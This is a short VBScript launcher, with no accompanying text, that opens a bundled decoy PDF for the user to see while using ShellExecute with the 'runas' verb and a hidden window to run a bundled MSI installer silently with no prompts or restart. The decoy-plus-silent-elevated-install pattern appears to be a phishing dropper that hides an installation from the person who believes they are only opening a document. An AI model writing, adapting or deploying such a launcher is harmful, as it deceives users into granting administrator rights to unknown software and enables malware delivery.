Set oShell = CreateObject("WScript.Shell")
Dim sFolder
sFolder = Left(WScript.ScriptFullName, InStrRev(WScript.ScriptFullName, "\"))
Dim msiPath
msiPath = sFolder & "install.msi"
Dim logPath
logPath = sFolder & "msi_log.txt"
Dim pdfPath
pdfPath = sFolder & "Document.pdf"
oShell.Run "rundll32.exe url.dll,FileProtocolHandler " & Chr(34) & pdfPath & Chr(34), 1, False
Set oUAC = CreateObject("Shell.Application")
oUAC.ShellExecute "msiexec", "/i " & Chr(34) & msiPath & Chr(34) & " /qn /norestart /log " & Chr(34) & logPath & Chr(34), "", "runas", 0
